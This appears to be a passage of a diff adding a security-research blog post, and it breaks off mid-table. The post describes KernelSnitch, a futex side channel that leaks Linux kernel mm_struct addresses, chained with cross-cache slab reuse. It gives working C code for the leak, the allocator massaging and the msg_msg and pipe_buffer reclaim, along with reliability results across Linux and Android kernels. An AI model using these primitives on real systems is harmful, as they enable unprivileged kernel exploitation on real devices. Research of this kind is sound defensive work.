+        size_t slab_end = slab_base + MM_SLAB_SIZE;
+
+        for (size_t mm_addr = slab_base; mm_addr < slab_end; mm_addr += MM_STRUCT_SIZE) {
+            size_t all_collide = 1;
+
+            for (size_t i = 1; i < TARGET_COLLISIONS; ++i) {
+                if (futex_hash(colliding_futex_addrs[0], mm_addr) !=
+                    futex_hash(colliding_futex_addrs[i], mm_addr)) {
+                    all_collide = 0;
+                    break;
+                }
+            }
+
+            if (all_collide) {
+                pr_success(" found mm_struct %016zx\n", mm_addr);
+                return mm_addr;
+            }
+        }
+    }
+
+    return -1;
+}</code></pre>
+      <div class="caption">Listing 8: Brute-force phase to recover the <code>mm_struct</code> location (<i>offline</i> phase).</div>
+
+      <p>
+        While this reduction is already strong, one caveat remains: the exact <code>sizeof(mm_struct)</code> and <code>mm_order</code> is kernel- and system-dependent and can change with kernel version, build options, and system configuration.
+        So to keep the attack as universal as possible, we model this as an estimation problem instead of hard-coding one size.
+        We therefore analyze which parameters influence <code>mm_struct</code> layout and build an estimator that predicts practical candidate strides and slot counts for the target system.
+        The good news is that <code>mm_struct</code> is allocated with hardware-cache alignment, so we do not need byte-perfect reconstruction of the layout.
+        In practice, an accuracy on the order of one cache line is sufficient for the estimation of <code>sizeof(mm_struct)</code> and, hence, the brute-force phase.
+      </p>
+
+      <p>
+        To recap, KernelSnitch combines four pieces into one reliable leak pipeline: futex hash-table shaping via thread creation plus <code>futex_wait</code>, non-destructive <code>futex_wake</code> timing to correlate bucket behavior with <code>mm_struct</code>-dependent hashing, allocator-based search-space reduction, and an offline brute-force over the remaining candidates.
+        In our setting, this yields a practical near-100% success rate for recovering <code>mm_struct</code>: we only accept a result when the collision-match score is exactly 1.
+        With a sufficiently large set of observed collisions, reaching that perfect match is mathematically overwhelmingly likely only for the true <code>mm_struct</code> location.
+      </p>
+
+      <p>
+        At this point, I can reliably recover the location of <code>mm_struct</code>, but that alone is usually not interesting for privilege escalation.
+        A natural next step would be to free the leaked <code>mm_struct</code> and reallocate the same slot with a more relevant target object.
+        However, Linux's heap segregation blocks this straightforward pivot.
+        The kernel does not treat heap memory as one undifferentiated pool.
+        Instead, allocations are separated by object type, size class, and cache-specific rules, which strongly limits naive reuse assumptions.
+      </p>
+
+      <h2 id="cross-cache-reuse">Cross-Cache Reuse to Same-Page-Order Targets</h2>
+
+      <p>
+        So when this naive reuse approach does not work, we need a different strategy: cross-cache reuse.
+        For that, we first need to understand how heap segregation works and how memory is reused across allocator layers.
+      </p>
+
+      <h3 id="kernel-memory-insights">Heap Segregation and Memory Hierarchy</h3>
+
+      <p>
+        In Linux, heap allocations are served by slab caches, where each cache manages one object layout or one size class.
+        Some objects use dedicated caches (e.g., <code>mm_struct</code> via <code>mm_cachep</code>), while many generic allocations use size-based caches (e.g., <code>kmalloc-*</code> caches).
+        A slab page belongs to exactly one cache at a time and is split into object slots for that cache only.
+        This is why leaking one object and then directly reallocating a different object type in the same slot usually fails.
+        The relevant pivot is therefore page lifecycle: once a slab page becomes fully free, it can leave one cache and later be reassigned to another.
+      </p>
+
+      <p>
+        Crucially, in this post, I consistently use the term <i>slab page</i> (singular), even when the slab is higher-order and backed by multiple contiguous base pages.
+      </p>
+
+      <p>
+        The Linux kernel memory hierarchy relevant for this attack is:
+        <strong>heap objects</strong> (typed objects such as <code>mm_struct</code> or <code>msg_msg</code>),
+        <strong>slabs</strong> (cache-backed pages with object slots),
+        <strong>PCP</strong> (per-CPU page lists shaping short-term reuse),
+        and <strong>buddy</strong> (the fallback page allocator).
+
+        In practice, cross-cache reuse starts once an empty slab page leaves its cache, and then follows one of two reuse paths:
+        First, the page is reclaimed directly from PCP for another allocation, which is constrained to matching page order.
+        Second, allocator pressure can push the page from PCP back to buddy, after which buddy may reissue it to a different allocation context.
+        If a different order is needed, buddy must change the order by either splitting a higher-order block or merging adjacent lower-order buddy pages.
+
+        For reliability in this part of the attack, I deliberately avoid touching buddy and focus on same-page-order cross-cache reuse through the PCP.
+        This keeps allocator behavior more stable and makes the reuse stages easier to control.
+      </p>
+
+      <div class="article-figure" style="--figure-width: 80%;">
+        <img src="cross_cache_reuse.svg" class="article-figure-media">
+        <div class="caption">Figure 7: Same-page-order cross-cache reuse: free the <code>mm_struct</code> slab (i.e., order 3), return it to PCP, then reclaim it at the same page order in the target context (i.e., <code>msg_msg</code>).</div>
+      </div>
+
+      <p>
+        To recap, the goal is to free the slab page from the dedicated <code>mm_cachep</code> and reclaim the memory chunk for a more relevant same-page-order target.
+        The required order is system-dependent (<code>mm_order = order(mm_cachep)</code>, e.g., 3 on some native systems and 2 on KernelCTF LTS instances).
+        Figure 7 visualizes this transition in two phases: &#9312; free enough <code>mm_struct</code> objects until the slab becomes empty and the slab is returned to PCP, and &#9313; trigger target allocations so the same slab is reclaimed by the <code>msg_msg</code> cache.
+      </p>
+
+      <p>
+        As discussed in <strong>KernelSnitch: Leaking mm_struct Locations</strong>, we first leak the location of one <code>mm_struct</code>.
+        From that single leak, we now derive the base address of its slab page using the known slab alignment (e.g., 8 pages in this setting).
+        We then perform cross-cache reuse so that this same slab page is reclaimed in the target context.
+        This yields a <code>msg_msg</code> slab and candidate <code>msg_msg</code> slots within those 8 pages.
+      </p>
+
+      <h3 id="slub-internals">SLUB Internals</h3>
+
+      <p>
+        As you might expect, it is not enough to free a few objects and hope the slab page returns to PCP.
+        To do this step correctly and as universally as possible, we need a view of slab internals.
+        Specifically, we focus on SLUB, the allocator used on modern Linux systems.
+      </p>
+
+      <div class="article-figure" style="--figure-width: 65%;">
+        <img src="slub_internals.svg" class="article-figure-media">
+        <div class="caption">Figure 8: Internal SLUB lists relevant for returning a slab page to PCP before reclaim.</div>
+      </div>
+
+      <p>
+        Figure 8 shows the SLUB internals that matter most for this transition.
+        The key point is that every slab cache, whether dedicated (e.g., <code>mm_cachep</code>) or generic (e.g., <code>kmalloc-*</code>), is represented by one <code>kmem_cache</code>.
+        That <code>kmem_cache</code> maintains per-CPU allocation state and slab-level metadata.
+        Freelists are the core mechanism and hold free object slots in linked-list form.
+        The active <code>c-&gt;freelist</code> drives fast-path object allocation/free on the current CPU, while <code>slab-&gt;freelist</code> and <code>partial-&gt;freelist</code> track reusable objects when slabs transition into these states.
+        Partial slabs are slabs that still have live objects, so they remain tracked and reusable inside the same cache.
+        If you are interested in the in-depth details of allocator internals and cross-cache mechanics, here are some useful references:
+        <a href="https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/">CVE-2022-29582 io_uring write-up</a>,
+        <a href="https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html">Jann Horn's write-up</a>,
+        <a href="../../publications/usenix24-slubstick.pdf">SLUBStick</a>,
+        <a href="https://claudiomigliorelli.com/assets/papers/pcplost_ndss26.pdf">PCPLost</a>,
+        and <a href="https://insuyun.github.io/pubs/2025/kim%3Acrossx.pdf">CROSS-X</a>.
+        I continue here with the practical deployment of cross-cache reuse.
+      </p>
+
+      <p>
+        In general, the strategy is to allocate many objects, leak one slab base address, and then free objects, including the leaked slab page, until that page is returned.
+        A key objective is to minimize the number of deallocations so runtime stays short and background activity has less chance to disrupt the reuse path.
+      </p>
+
+      <h3 id="return-to-pcp">Returning the Leaked Slab Page to PCP</h3>
+
+      <p>
+        The naive approach would be to free many objects until several slab pages become empty and then hope that reuse eventually hits the right one.
+        However, this takes longer and does not guarantee success.
+        Instead, our goal is to shape slab-cache state so a minimal number of deallocations is enough to free exactly the leaked slab page.
+        In practice, this is done by freeing the leaked slab and shaping the partial state to trigger reuse.
+        After some experimentation, I found that the following is the most practical workflow across different kernel versions and systems, where <code>mm_sz</code> and <code>mm_order</code> are determined using the <code>mm_struct</code> estimator:
+      </p>
+
+      <pre><code class="language-c">static size_t mm_sz;
+static size_t mm_order;
+
+#define MM_OBJS_PER_SLAB ((1<<(12+mm_order))/mm_sz)
+#define MM_PARTIALS 10
+#define MM_PREPARE (128*MM_OBJS_PER_SLAB)
+#define MM_SPRAY ((MM_PARTIALS+1)*MM_OBJS_PER_SLAB)
+#define MM_BEFORE (MM_OBJS_PER_SLAB-1)
+#define MM_AFTER (MM_OBJS_PER_SLAB)
+
+static pid_t pids_prep[MM_PREPARE];
+static pid_t pids_spray[MM_SPRAY];
+static pid_t pids_slab_before[MM_BEFORE];
+static pid_t pid_leaked;
+static pid_t pids_slab_after[MM_AFTER];
+
+void return_leaked_page_to_pcp(void)
+{
+    // Allocation phase
+    for (size_t i = 0; i < MM_PREPARE; ++i)
+        pids_prep[i] = alloc_mm_struct();
+    for (size_t i = 0; i < MM_SPRAY; ++i)
+        pids_spray[i] = alloc_mm_struct();
+    for (size_t i = 0; i < MM_BEFORE; ++i)
+        pids_slab_before[i] = alloc_mm_struct();
+    pid_leaked = alloc_mm_struct();
+    for (size_t i = 0; i < MM_AFTER; ++i)
+        pids_slab_after[i] = alloc_mm_struct();
+
+    // Leak phase
+    size_t mm = leak_mm_struct(pid_leaked);
+    size_t mm_base_addr = (mm & ~((1<<(12+mm_order))-1));
+
+    // Return-to-PCP phase
+    for (size_t i = 0; i < MM_SPRAY/2; i+=MM_OBJS_PER_SLAB)
+        free_mm_struct(pids_spray[i]);
+    for (size_t i = 0; i < MM_BEFORE; ++i)
+        free_mm_struct(pids_slab_before[i]);
+    for (size_t i = 0; i < MM_AFTER-1; ++i)
+        free_mm_struct(pids_slab_after[i]);
+    for (size_t i = MM_SPRAY/2; i < MM_SPRAY; i+=MM_OBJS_PER_SLAB)
+        free_mm_struct(pids_spray[i]);
+    free_mm_struct(pid_leaked);
+}</code></pre>
+      <div class="caption">Listing 9: Returning the leaked page to the PCP from user space.</div>
+
+      <p>
+        Listing 9 is organized into three phases.
+      </p>
+      <ul>
+        <li>
+          <strong>Allocation phase:</strong> I allocate many <code>mm_struct</code> objects using <code>syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0)</code>.
+          I initially allocate <code>MM_SPRAY</code> objects so non-active freelists (i.e., <code>slab-&gt;freelist</code> and partial freelists) have no free slots.
+          Then I allocate <code>MM_PARTIALS</code> slabs (i.e., 10 in this setup), deliberately above <code>min_partial</code> (i.e., 5 for <code>mm_struct</code>).
+          While <code>min_partial</code> is typically the minimum threshold at which fully free slabs become eligible for return to PCP (in the return-to-PCP phase), I intentionally go beyond it to absorb potential allocation noise and keep return-to-PCP behavior stable.
+          Lastly, I place the leaked object in a controlled slab by allocating <code>MM_BEFORE + 1 + MM_AFTER</code> objects around <code>pid_leaked</code>.
+        </li>
+        <li>
+          <strong>Leak phase:</strong> I leak the <code>mm_struct</code> address of <code>pid_leaked</code> and compute the slab base via <code>mm_order</code>-dependent alignment.
+          This gives the exact slab page that must be returned to PCP for the reuse step.
+        </li>
+        <li>
+          <strong>Return-to-PCP phase:</strong> Here, the goal is to drive the leaked <code>mm_struct</code> slab page out of <code>mm_cachep</code> so it becomes reclaimable from PCP at the same page order.
+          To massage the slab allocator toward that outcome, I first shape partial slabs by freeing one object per sprayed slab in the first half.
+          I then free objects around <code>pid_leaked</code>, including the leaked object itself, so that the leaked slab can become fully free, and finally continue shaping with the second half of the spray.
+          This ordering keeps partial pressure high while maximizing the chance that the leaked slab page is the one returned to PCP.
+          Deallocation is performed through the lower-noise two-step path described below.
+        </li>
+      </ul>
+
+      <p>
+        I found two practical ways to allocate a fresh <code>mm_struct</code>: <code>fork</code> and <code>exec</code>.
+        Freeing is typically done in <code>exit</code>.
+        These paths allocate and free many additional resources during process creation and destruction, which can introduce noise and instability if not handled carefully.
+        For the allocation side, this is manageable because <code>mm_struct</code> uses a dedicated cache that is largely isolated from unrelated object traffic.
+        So for spraying, I use a lightweight <code>clone</code>-based path as described above which works reliably.
+        For the return-to-PCP phase, however, minimizing side allocations and side deallocations is crucial.
+        Extra allocations may steal a freshly returned page, while extra frees may over-pressure PCP and drain pages back to buddy at the wrong time.
+        So we need a cleaner, more controlled way to free <code>mm_struct</code>.
+      </p>
+
+      <p>
+        Looking through the Linux code, the key mechanism is that <code>mm_struct</code> lifetime is governed by a reference counter.
+        A reference counter is an integer that tracks how many active users still hold a reference to an object.
+        As long as this value is non-zero, the object must remain alive.
+        Each release decrements the counter, and only when it reaches zero can the object be finalized and freed.
+        This gives us control over the <code>mm_struct</code>'s lifetime: by controlling where references are released, we can trigger <code>mm_struct</code> frees with less allocator noise than on process destruction.
+      </p>
+
+      <pre><code class="language-c">// Allocates an mm_struct and initializes its reference counter to 1
+static pid_t __clone(void)
+{
+    pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
+    if (child == 0) {
+        pin_to_core(CORE);
+        while (1)
+            pause();
+        exit(0);
+    }
+    return child;
+}
+
+// Opens /proc/&lt;pid&gt;/mem and takes an additional mm_struct reference
+static int __memfd(pid_t child)
+{
+    char path[128];
+    memset(path, 0, sizeof(path));
+    snprintf(path, sizeof(path), "/proc/%d/mem", child);
+    return SYSCHK(open(path, O_RDONLY));
+}
+
+// Holds two lifetime references to mm_struct (task + /proc/&lt;pid&gt;/mem fd)
+struct mm_ctx {
+    pid_t child;
+    int fd;
+};
+void alloc_mm_struct(struct mm_ctx *ctx)
+{
+    ctx->child = __clone();
+    ctx->fd = __memfd(ctx->child);
+}</code></pre>
+      <div class="caption">Listing 10: <code>mm_struct</code> allocation triggered from user space.</div>
+
+      <p>
+        After inspecting the kernel path, I found that opening <code>"/proc/&lt;pid&gt;/mem"</code> in <code>proc_mem_open</code> increments the <code>mm_struct</code> lifetime reference.
+        So the user-space allocation path is illustrated in Listing 10: clone a child and then open the child's <code>mem</code> file.
+        On all evaluated systems, this is permitted for unprivileged users.
+        This also holds in SELinux-constrained environments: I verified it on both a rooted and a non-rooted Google Pixel with SELinux in enforcing mode.
+      </p>
+
+      <pre><code class="language-c">// Destroys the process, releases most resources, and decreases one mm_struct reference
+static void __kill_child_process(pid_t child)
+{
+    SYSCHK(kill(child, SIGKILL));
+    SYSCHK(waitpid(child, NULL, 0));
+}
+void free_mm_struct_pre(struct mm_ctx *ctx)
+{
+    __kill_child_process(ctx->child);
+}
+
+// Drops the remaining mm_struct reference and frees it with significantly less allocator noise
+void free_mm_struct_final(struct mm_ctx *ctx)
+{
+    SYSCHK(close(ctx->fd));
+}</code></pre>
+      <div class="caption">Listing 11: <code>mm_struct</code> freeing triggered from user space.</div>
+
+      <p>
+        The free path is split into two steps (see Listing 11).
+        First, I kill the child process via <code>SIGKILL</code> and wait for termination with <code>waitpid</code>, which drops the process-owned reference.
+        However, after opening <code>"/proc/&lt;pid&gt;/mem"</code>, that alone does not free the <code>mm_struct</code>.
+        Only when I close the corresponding file descriptor later does the reference counter reach zero, and the <code>mm_struct</code> is released with significantly less allocator noise than full process teardown.
+      </p>
+
+      <p>
+        After adapting the free strategy for <code>mm_struct</code>, Listing 9 also needs to be adjusted.
+        After the allocation phase, I wait until all cloned processes are running and then kill them via <code>free_mm_struct_pre</code>.
+        This way, during the return-to-PCP phase, I only need to call <code>free_mm_struct_final</code> to free <code>mm_struct</code>.
+        One additional change is required to make this work.
+        The <code>leak_mm_struct</code> function only leaks the <code>mm_struct</code> of the current process, but here I need the <code>mm_struct</code> of <code>pid_leaked</code>.
+        To achieve that, I use a dedicated child process that leaks its own <code>mm_struct</code> and shares the result with the main process via shared memory.
+      </p>
+
+      <h3 id="reclaiming">Reclaiming as Target Objects</h3>
+
+      <p>
+        At this stage of the attack, I know the leaked slab page has already been returned to PCP.
+        From there, same-page-order cross-cache reclaim follows two steps.
+        First, prior to the return-to-PCP, in a preparation phase, I allocate many target objects to drain freelists and partial lists in the destination cache.
+        Second, in the reclaim phase, I allocate targets so allocation falls back to PCP.
+        Because PCP reuse is LIFO-like on the same CPU in this scenario, the recently returned leaked page is often reclaimed quickly.
+      </p>
+
+      <p>
+        Across all evaluated systems, I observe that allocation sizes from 513 bytes up to 8 KiB use slab caches with the same slab-page order as <code>mm_cachep</code>.
+        Examples are the generic slab caches kmalloc-1k till kmalloc-8k.
+        This matters for same-page-order reuse, because it provides a broad set of reclaim candidates beyond a single object type.
+      </p>
+
+      <pre><code class="language-c">typedef struct {
+    long mtype;
+    char mtext[1];
+} msg_t;
+
+void alloc_msg_msg_4k(void)
+{
+    static char buffer[4096] = {0};
+    msg_t *message = (msg_t *)buffer;
+    message->mtype = 0x41;
+
+    // prepares the message queue qid
+    int qid = SYSCHK(msgget(IPC_PRIVATE, 0666 | IPC_CREAT));
+    // allocates the msg_msg from a 4k slab cache
+    SYSCHK(msgsnd(qid, message, 4096-48, 0));
+}</code></pre>
+      <div class="caption">Listing 12: Allocate <code>msg_msg-4k</code>, which has the same slab-page order as <code>mm_struct</code>.</div>
+
+      <p>
+        Listing 12 shows the user-space allocation primitive for <code>msg_msg-4k</code>.
+        I first create a message queue with <code>msgget</code>, then send a carefully sized message with <code>msgsnd</code> so the kernel allocates the corresponding <code>msg_msg</code> object from the 4 KiB target cache.
+        In reuse terms, this is the reclaim trigger: after returning the leaked <code>mm_struct</code> slab page to PCP, repeated calls to this primitive steer the allocator to reuse that page in the <code>msg_msg</code> context.
+      </p>
+
+      <p>
+        Listing 12 is illustrative.
+        In the proof of concept, I split preparation and actual allocation to reduce potential allocator noise.
+      </p>
+
+      <pre><code class="language-c">void alloc_pipe_buffer_1k(void)
+{
+    static int pipe_fd[2];
+    // 16 slots will be allocated from kmalloc-cg-1k
+    const size_t nr_slots = FLOOR_POW_OF_2(1024/40);
+
+    // prepares the pipe file descriptor
+    SYSCHK(pipe(pipe_fd));
+    // allocates the pipe_buffer from kmalloc-cg-1k
+    SYSCHK(fcntl(pipe_fd[0], F_SETPIPE_SZ, nr_slots << 12));
+}</code></pre>
+      <div class="caption">Listing 13: Allocate <code>pipe_buffer-1k</code>, which has the same slab-page order as <code>mm_struct</code>.</div>
+
+      <p>
+        Listing 13 shows the alternative reclaim primitive for <code>pipe_buffer-1k</code>.
+        The function creates a pipe and then sets its capacity so the kernel allocates the corresponding <code>pipe_buffer</code> structures from a 1 KiB generic cache in this setup.
+      </p>
+
+      <p>
+        In contrast to <code>msg_msg</code> allocation, resizing pipes also deallocates old <code>pipe_buffer</code> objects, which introduces additional allocator noise.
+        This extra deallocation activity can disrupt the shaped slab/PCP state and can cause reclaim failures.
+        To avoid that, I add an intermediate step.
+        After returning the leaked <code>mm_struct</code> slab page to PCP, I first reclaim it as a data page with a low-noise slab-to-page transition.
+        After that reclaim succeeds, I reshape PCP and perform the final page-to-slab reuse into <code>pipe_buffer</code>.
+      </p>
+
+      <pre><code class="language-c">static char __buf[65536];
+static struct iovec __iov_2_order = { .iov_base = __buf, .iov_len = 20000 };
+static struct msghdr __m_2_order = { .msg_iov = &__iov_2_order, .msg_iovlen = 1 };
+static struct iovec __iov_3_order = { .iov_base = __buf, .iov_len = 65536 };
+static struct msghdr __m_3_order = { .msg_iov = &__iov_3_order, .msg_iovlen = 1 };
+void alloc_free_data_page(void)
+{
+    int sv[2];
+    // prepare the sk_buff for the data page allocation
+    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, sv));
+    // order-2 data page allocation via sk_buff->frag
+    SYSCHK(sendmsg(sv[0], &__m_2_order, 0));
+    // free sk_buff->frag data page
+    SYSCHK(close(sv[0]));
+    SYSCHK(close(sv[1]));
+}</code></pre>
+      <div class="caption">Listing 14: Allocating and deallocating order-2 and order-3 data pages via <code>sk_buff-&gt;frag</code>.</div>
+
+      <p>
+        Listing 14 shows a low-noise page-allocation primitive based on <code>sk_buff-&gt;frag</code>.
+        The core idea is to create a local socket pair and use <code>sendmsg</code> so the kernel backs payload transfer with fragment pages.
+        The payload size controls the requested page order (e.g., <code>__m_2_order</code> for order-2 and <code>__m_3_order</code> for order-3), and closing the sockets frees those pages again.
+      </p>
+
+      <h2 id="eval">Evaluation</h2>
+
+      <p>
+        In this section, I first evaluate the estimator for the target-specific KernelSnitch parameters across all evaluated environments.
+        Then, I evaluate KernelSnitch on its own and observe a near-100% success rate for leaking <code>mm_struct</code> with the same core proof of concept across targets.
+        Finally, I combine KernelSnitch with same-page-order cross-cache reuse and evaluate end-to-end reliability and applicability.
+        For each environment, I run 100 trials across 5 separate reboots, yielding 500 runs per environment.
+      </p>
+
+      <p>
+        Everything up to this point belongs to the unprivileged attack path: futex-based leakage, allocator shaping, return of the leaked slab page to PCP, reclamation as <code>msg_msg</code> or <code>pipe_buffer</code>, and final address recovery by brute force.
+        The privileged interfaces used here (a custom implemented kernel module and <code>/sys/kernel/slab</code>) are only for validation and allocator introspection during evaluation.
+        They make the write-up easier to verify and understand, but they are not prerequisites for the attack.
+        The kernel module provides ground-truth leakage and page diagnostics through four commands:
+        <code>LEAK_MM_STRUCT</code>, <code>LEAK_MSG_MSG</code>, <code>LEAK_PIPE_BUFFER</code>, and <code>PAGE_DIAG</code>.
+        The first three return direct object addresses for validation, while <code>PAGE_DIAG</code> reports page-level ownership and metadata.
+        Concretely, diagnostics distinguish slab/PCP/buddy/data-page ownership and include relevant fields such as slab-cache name, CPU, page order, and reference counter depending on the current owner.
+      </p>
+
+      <h3 id="mm-estimator">Estimator of mm_struct</h3>
+
+      <p>
+        Our attack depends on two target-specific allocator parameters: <code>sizeof(mm_struct)</code> and the slab-page order used by <code>mm_cachep</code>.
+        Both depend on software and hardware characteristics.
+        On the software side, the main factors are kernel configuration and build options.
+        On the hardware side, allocator behavior depends in part on the number of physical CPU cores.
+        If either parameter is wrong, the brute-force phase fails to recover <code>mm_struct</code>.
+        In practice, this yields no valid candidate rather than a stable but incorrect one.
+        A fallback is therefore to test multiple parameter combinations directly in brute force, but that increases runtime notably.
+      </p>
+
+      <p>
+        Instead, I implement an estimator that takes two inputs: the target kernel configuration (or a relevant subset) and the number of physical CPU cores.
+        From these inputs, it estimates both outputs required by the attack: <code>sizeof(mm_struct)</code> and <code>order(mm_cachep)</code>.
+        In practice, this keeps the pipeline portable across systems without manual per-target retuning.
+      </p>
+
+      <div class="eval-table-wrap">
+        <table class="eval-table">
+          <thead>
+            <tr>
+              <th>Environment</th>
+              <th>Kernel</th>
+              <th>Physical Cores</th>
+              <th colspan="2">mm_struct Estimation</th>
+            </tr>
+            <tr>
+              <th></th>
+              <th></th>
+              <th></th>
+              <th><code>sizeof(mm_struct)</code></th>
+              <th><code>order(mm_cachep)</code></th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Ubuntu (ThinkPad P14s Gen 4)</td>
+              <td>6.8.0-101-generic</td>
+              <td>12</td>
+              <td>1408</td>
+              <td>3</td>
+            </tr>
+            <tr>
+              <td>Ubuntu (ThinkPad P14s Gen 4)</td>
+              <td>6.5.0-14-generic</td>
+              <td>12</td>
+              <td>1408</td>
+              <td>3</td>
+            </tr>
+            <tr>
+              <td>Fedora (ThinkPad P14s Gen 5)</td>
+              <td>6.18.13-200.fc43</td>
+              <td>16</td>
+              <td>1536</td>
+              <td>3</td>
+            </tr>
+            <tr>
+              <td>Debian (Raspberry Pi 3)</td>
+              <td>6.12.47+rpt-rpi-v8</td>
+              <td>4</td>
+              <td>1216</td>
+              <td>3</td>
+            </tr>
+            <tr>
+              <td>Android (Google Pixel 8a)</td>
+              <td>6.1.145-android14-11</td>
+              <td>9</td>
+              <td>1024</td>
+              <td>3</td>
+            </tr>
+            <tr>
+              <td>Buildroot</td>
+              <td>6.12.66</td>
+              <td>8</td>
+              <td>1344</td>
+              <td>3</td>
+            </tr>
+            <tr>
+              <td>KernelCTF</td>
+              <td>lts-6.1.81</td>
+              <td>2</td>
+              <td>1088</td>
+              <td>2</td>
+            </tr>
+            <tr>
+              <td>KernelCTF</td>
+              <td>lts-6.6.98</td>
+              <td>2</td>
+              <td>1344</td>
+              <td>2</td>
+            </tr>
+            <tr>
+              <td>KernelCTF</td>
+              <td>lts-6.12.77</td>
+              <td>2</td>
+              <td>1344</td>
+              <td>2</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="caption">Table 1: Estimated <code>sizeof(mm_struct)</code> and <code>order(mm_cachep)</code> across evaluated targets.</div>
+
+      <p>
+        Table 1 summarizes the estimator outputs for each target environment, i.e., <code>./estimate_mm_struct.py config nr_cpus</code>.
+        The results match the ground-truth values, which can be obtained from <code>/sys/kernel/slab/mm_struct/slab_size</code> for <code>sizeof(mm_struct)</code> and <code>/sys/kernel/slab/mm_struct/order</code> for <code>order(mm_cachep)</code>.
+      </p>
+
+      <h3 id="results-kernelsnitch">KernelSnitch-Only Results</h3>
+
+      <p>
+        Before combining with cross-cache reuse, I evaluate KernelSnitch on its own by repeatedly running the <code>mm_struct</code> leakage phase on every environment listed in Table 2.
+        I use the same core proof of concept code, with architecture-dependent timing and physmap parameters fixed at compile time for x86_64 and aarch64.
+        Across these repeated runs, KernelSnitch recovers the target <code>mm_struct</code> location every time, validated with the privileged kernel module.
+        Although this is 100% in the observed experiments, I refer to it as near-100% to acknowledge a negligibly small residual failure probability.
+      </p>
+
+      <h3 id="results-environments">Combined Evaluation: KernelSnitch + Cross-Cache Reuse</h3>
+
+      <p>
+        For the combined evaluation, I again use the same core proof-of-concept code.
+        The reclaim target is <code>pipe_buffer</code> on Android and <code>msg_msg</code> on the other environments (results are consistent when using <code>pipe_buffer</code> as well).
+        Architecture-dependent parameters are handled exactly as in the KernelSnitch-only evaluation.
+        The most reliable combined sequence is as follows (using <code>msg_msg</code> as the illustrative example).
+      </p>
+
+      <ul>
+        <li><strong>Preparation stage</strong>
+          <ul>
+            <li>[KernelSnitch] Futex setup</li>
+            <li>[Cross-cache reuse] Allocate <code>mm_struct</code> objects and drain <code>msg_msg</code> freelists</li>
+            <li>[Cross-cache reuse] Kill child processes</li>
+          </ul>
+        </li>
+        <li><strong>Leakage stage</strong>
+          <ul>
+            <li>[KernelSnitch] Find collisions for <code>mm_struct_leak</code></li>
+            <li>[Cross-cache reuse] Return <code>mm_struct_leak</code> slab to PCP</li>
+            <li>[Cross-cache reuse] Reclaim as <code>msg_msg_leak</code></li>
+            <li>[KernelSnitch] Brute-force to recover the slab base of <code>msg_msg_leak</code></li>
+          </ul>
+        </li>
+        <li><strong>Validation stage</strong>
+          <ul>
+            <li>[Kernel module] Validate with <code>LEAK_MSG_MSG</code></li>
+            <li>[Kernel module] Cross-check with <code>PAGE_DIAG</code></li>
+          </ul>
+        </li>
+      </ul>
+
+      <p>
+        For additional educational context, I also use privileged data from <code>/sys/kernel/slab</code> during evaluation, specifically <code>slabs</code>, <code>total_objects</code>, <code>slabs_cpu_partial</code>, and <code>partial</code>.
+        This is not required for the attack itself, but it clearly illustrates allocator behavior.
+        If you want to reproduce and understand how pages move across allocator layers, I recommend running the code in a virtual machine with both kernel-module diagnostics and <code>/sys/kernel/slab</code> signals enabled.
+      </p>
+
+      <div class="eval-table-wrap">
+        <table class="eval-table">
+          <thead>
+            <tr>
+              <th>Environment</th>
+              <th>Kernel</th>
+              <th>Setup</th>
+              <th>Target Cache</th>
+              <th colspan="6">Observed Reliability</th>
+            </tr>
+            <tr>
+              <th></th>
+              <th></th>
+              <th></th>
+              <th></th>
+              <th>R1</th>
+              <th>R2</th>
+              <th>R3</th>
+              <th>R4</th>
+              <th>R5</th>
+              <th>Overall</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Ubuntu (ThinkPad P14s Gen 4)</td>
+              <td>6.8.0-101-generic</td>
+              <td>native x86_64</td>
+              <td><code>kmalloc-cg-4k</code></td>
+              <td>100</td>
+              <td>99</td>
+              <td>99</td>
+              <td>99</td>
+              <td>99</td>
+              <td>99.2</td>
+            </tr>
+            <tr>
+              <td>Ubuntu (ThinkPad P14s Gen 4)</td>
+              <td>6.5.0-14-generic</td>
+              <td>native x86_64</td>
+              <td><code>kmalloc-cg-4k</code></td>
+              <td>100</td>
+              <td>99</td>
+              <td>99</td>
+              <td>100</td>
+              <td>98</td>
+              <td>99.2</td>
+            </tr>
+            <tr>
+              <td>Fedora (ThinkPad P14s Gen 5)</td>
+              <td>6.18.13-200.fc43</td>
+              <td>native x86_64</td>
+              <td><code>msg_msg-4k</code></td>
+              <td>100</td>
+              <td>100</td>
+              <td>100</td>
+              <td>100</td>
+              <td>100</td>
+              <td>100</td>
+            </tr>
+            <tr>
+              <td>Debian (Raspberry Pi 3)</td>
+              <td>6.12.47+rpt-rpi-v8</td>
+              <td>native aarch64</td>
+              <td><code>kmalloc-4k</code></td>
+              <td>99</td>
+              <td>100</td>
+              <td>97</td>
+              <td>96</td>
+              <td>99</td>
+              <td>98.2</td>
+            </tr>
+            <tr>
+              <td>Android (Google Pixel 8a)</td>
+              <td>6.1.145-android14-11</td>
+              <td>native aarch64</td>
+              <td><code>kmalloc-cg-1k</code></td>
+              <td>75</td>
+              <td>65</td>
+              <td>88</td>
+              <td>76</td>
+              <td>77</td>
+              <td>76.2</td>
+            </tr>
+            <tr>
+              <td>Buildroot</td>
+              <td>6.12.66</td>
+              <td>virtualized x86_64</td>
+              <td><code>msg_msg-4k</code></td>
+              <td>100</td>
+              <td>99</td>
+              <td>100</td>
+              <td>100</td>
+              <td>100</td>
+              <td>99.8</td>
+            </tr>
+            <tr>
+              <td>KernelCTF</td>
+              <td>lts-6.1.81</td>
+              <td>virtualized x86_64</td>
+              <td><code>kmalloc-cg-1k</code></td>
+              <td>100</td>
+              <td>97</td>
+              <td>96</td>
+              <td>98</td>
+              <td>99</td>
+              <td>98</td>
+            </tr>
+            <tr>
+              <td>KernelCTF</td>
+              <td>lts-6.6.98</td>
+              <td>virtualized x86_64</td>
+              <td><code>kmalloc-cg-1k</code></td>
+              <td>99</td>
+              <td>100</td>
+              <td>94</td>
+              <td>99</td>
+              <td>96</td>
+              <td>97.6</td>
+            </tr>
+            <tr>
+              <td>KernelCTF</td>
